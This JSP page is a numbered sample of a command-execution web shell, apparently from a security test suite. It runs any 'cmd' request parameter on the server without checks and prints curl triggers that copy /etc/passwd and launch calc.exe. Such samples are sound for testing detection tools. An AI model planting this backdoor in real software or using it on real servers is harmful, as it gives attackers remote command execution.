<%@page import="java.io.*" %>
<%@ page contentType="text/html; charset=UTF-8" %>
<html>
<head>	
	<meta charset="UTF-8"/>
	<title>004 - 命令执行后门（无回显）</title>
</head>
<body>
	<h1>004 - 命令执行后门（无回显）</h1>

<%
String linux_querystring = "?cmd=cp+/etc/passwd+/tmp/";
String windows_querystring = "?cmd=calc";
String cmd = request.getParameter("cmd");
if (cmd != null) {
	try {
		Runtime.getRuntime().exec(cmd);
	} catch (Exception e) {
	    out.print(e);
	}
}
%>
	<p>Linux 触发: </p>
	<p>curl '<a href="<%=request.getRequestURL()+linux_querystring%>" target="_blank"><%=request.getRequestURL()+linux_querystring%></a>'</p>
	<p>然后检查 /tmp 是否存在 passwd 这个文件</p>
	<br>

	<p>Windows 触发: </p>
	<p>curl '<a href="<%=request.getRequestURL()+windows_querystring%>" target="_blank"><%=request.getRequestURL()+windows_querystring%></a>'</p>
	<p>点击这里执行 calc.exe</p>
</body>
</html>
